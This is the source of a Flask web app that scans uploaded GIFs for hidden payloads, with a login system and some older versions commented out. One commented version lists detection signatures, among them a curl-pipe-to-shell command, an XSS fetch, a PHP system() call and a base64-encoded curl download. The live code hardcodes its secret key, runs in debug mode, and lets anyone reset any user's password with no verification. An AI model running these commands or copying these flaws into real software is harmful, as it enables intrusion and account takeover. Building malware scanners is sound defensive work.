# from flask import Flask, render_template, request, redirect, url_for
# import os
# import shutil
# from test_model import predict_gif

# app = Flask(__name__)
# UPLOAD_FOLDER = "uploads"
# STATIC_FOLDER = "static"
# app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

# os.makedirs(UPLOAD_FOLDER, exist_ok=True)
# os.makedirs(STATIC_FOLDER, exist_ok=True)

# @app.route("/", methods=["GET", "POST"])
# def index():
#     if request.method == "POST":
#         if "gif_file" not in request.files:
#             return redirect(request.url)
#         file = request.files["gif_file"]
#         if file.filename == "":
#             return redirect(request.url)
#         if file:
#             file_path = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
#             file.save(file_path)

#             # Copy to static/preview.gif for browser viewing
#             shutil.copy(file_path, os.path.join(STATIC_FOLDER, "preview.gif"))

#             label, method = predict_gif(file_path)
#             return render_template("index.html", result=(label, method), file_name=file.filename)
#     return render_template("index.html")

# if __name__ == "__main__":
#     app.run(debug=True)

# from flask import Flask, render_template, request, url_for
# import os
# from werkzeug.utils import secure_filename
# import base64

# app = Flask(__name__)
# app.config['UPLOAD_FOLDER'] = os.path.join('static', 'uploads')
# os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# infection_methods = {
#     "append_shell": "curl http://malicious.site | sh",
#     "append_js": "<script>fetch('http://xss.com')</script>",
#     "append_php": "<?php system('ls'); ?>",
#     "append_base64": "base64: Y3VybCBodHRwOi8vbWFsd2FyZS5zaA==",
#     "append_html": "<!--<div onclick='fetch(\"http://stealth\")'></div>-->",
#     "metadata_comment": "GIF infected: fetch evil.sh"
# }

# scan_history = []

# def detect_payload(content: bytes):
#     content_str = content.decode(errors='ignore')
#     for method, payload in infection_methods.items():
#         if payload in content_str:
#             extracted = payload
#             if "base64:" in payload:
#                 b64_part = payload.split("base64:")[1].strip()
#                 try:
#                     decoded = base64.b64decode(b64_part).decode()
#                     extracted += f"\nDecoded base64: {decoded}"
#                 except Exception:
#                     extracted += "\n[Failed to decode base64]"
#             return ("infected", method, extracted)
#     return ("clean", "none", "No malicious code found")

# @app.route("/", methods=["GET", "POST"])
# def index():
#     result = None
#     file_name = None
#     extracted_payload = None

#     if request.method == "POST":
#         file = request.files.get("gif_file")
#         if file and file.filename.endswith(".gif"):
#             filename = secure_filename(file.filename)
#             file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
#             file.save(file_path)

#             with open(file_path, "rb") as f:
#                 content = f.read()
#                 result = detect_payload(content)
#                 file_name = filename
#                 extracted_payload = result[2]

#             scan_history.insert(0, {
#                 "file_name": file_name,
#                 "status": result[0],
#                 "method": result[1],
#                 "payload": extracted_payload
#             })

#     return render_template(
#         "index.html",
#         result=result,
#         file_name=file_name,
#         payload=extracted_payload,
#         history=scan_history
#     )

# if __name__ == "__main__":
#     app.run(host="0.0.0.0", port=5000, debug=True)

##########################################################################################################


from flask import Flask, render_template, request, redirect, url_for, session, flash, send_file
import os, sqlite3
import csv
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash
from test_model import predict_gif
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)
app.secret_key = "super-secret-key"
app.config['UPLOAD_FOLDER'] = os.path.join('static', 'uploads')
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# === Auth DB Setup ===
def init_db():
    with sqlite3.connect("users.db") as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT
        )''')
init_db()

scan_history = []

# === Routes ===
@app.route("/")
def home():
    if 'username' not in session:
        return redirect(url_for('login'))
    return redirect(url_for("index"))

@app.route("/about")
def about():
    return render_template("about.html")

# === LOGIN ===
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        user = request.form["username"]
        pwd = request.form["password"]
        with sqlite3.connect("users.db") as conn:
            cur = conn.cursor()
            cur.execute("SELECT password FROM users WHERE username=?", (user,))
            row = cur.fetchone()
            if row and check_password_hash(row[0], pwd):
                session['username'] = user
                return redirect(url_for("index"))
            flash("Invalid credentials", "danger")
    return render_template("login.html")

# === SIGNUP ===
@app.route("/signup", methods=["GET", "POST"])
def signup():
    if request.method == "POST":
        user = request.form["username"]
        pwd = request.form["password"]
        hashed_pwd = generate_password_hash(pwd)
        with sqlite3.connect("users.db") as conn:
            try:
                conn.execute("INSERT INTO users (username, password) VALUES (?, ?)", (user, hashed_pwd))
                flash("Signup successful. Please log in.", "success")
                return redirect(url_for("login"))
            except sqlite3.IntegrityError:
                flash("Username already exists!", "danger")
    return render_template("signup.html")

# === LOGOUT ===
@app.route("/logout")
def logout():
    session.pop("username", None)
    flash("Logged out successfully.", "info")
    return redirect(url_for("login"))

@app.route("/download_report")
def download_report():
    if not scan_history:
        flash("No scan history to export!", "warning")
        return redirect(url_for("index"))
    csv_path = "scan_report.csv"
    # Use UTF-8 encoding with BOM for Excel compatibility, handle encoding errors
    with open(csv_path, mode='w', newline='', encoding='utf-8-sig', errors='replace') as file:
        writer = csv.writer(file)
        writer.writerow(["File Name", "Status", "Detection Method", "Extracted Payload"])
        for entry in scan_history:
            # Clean and encode payload to handle special characters
            payload = entry.get("payload", "")
            if payload:
                # Replace problematic characters that can't be encoded
                payload = str(payload).encode('utf-8', errors='replace').decode('utf-8', errors='replace')
            writer.writerow([
                entry.get("file_name", ""),
                entry.get("status", ""),
                entry.get("method", ""),
                payload
            ])
    return send_file(csv_path, as_attachment=True, mimetype='text/csv; charset=utf-8')

# === FORGOT PASSWORD ===
@app.route("/forgot_password", methods=["GET", "POST"])
def forgot_password():
    if request.method == "POST":
        username = request.form.get("username")
        new_password = request.form.get("new_password")
        confirm_password = request.form.get("confirm_password")

        if new_password != confirm_password:
            flash("Passwords do not match!", "danger")
            return redirect(url_for("forgot_password"))

        with sqlite3.connect("users.db") as conn:
            cur = conn.cursor()
            cur.execute("SELECT * FROM users WHERE username=?", (username,))
            if not cur.fetchone():
                flash("Username not found!", "danger")
                return redirect(url_for("forgot_password"))

            hashed_pwd = generate_password_hash(new_password)
            cur.execute("UPDATE users SET password=? WHERE username=?", (hashed_pwd, username))
            conn.commit()
            flash("Password updated successfully! Please login.", "success")
            return redirect(url_for("login"))

    return render_template("forgot_password.html")

# === SCAN / INDEX ===
@app.route("/scan", methods=["GET", "POST"])
def index():
    if 'username' not in session:
        return redirect(url_for('login'))

    result = None
    file_name = None
    extracted_payload = None

    if request.method == "POST":
        file = request.files.get("gif_file")
        model_type = request.form.get("model_type", "cnn")  # Default to CNN if not specified
        
        if file and file.filename.endswith(".gif"):
            filename = secure_filename(file.filename)
            file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            file.save(file_path)

            # Get API key from environment if using advanced analysis model
            gemini_api_key = os.getenv("GEMINI_API_KEY") if model_type == "llm" else None
            prediction = predict_gif(file_path, model_type=model_type, gemini_api_key=gemini_api_key)
            result = (
                prediction["prediction"],
                prediction["model_method"],
                prediction["payload_detected"],
                model_type  # Add model type to result
            )
            file_name = filename
            extracted_payload = prediction["extracted_payload"]

            scan_history.insert(0, {
                "file_name": file_name,
                "status": result[0],
                "method": result[1],
                "payload": extracted_payload,
                "model_type": model_type
            })

    return render_template(
        "index.html",
        result=result,
        file_name=file_name,
        payload=extracted_payload,
        history=scan_history,
        username=session.get('username')
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
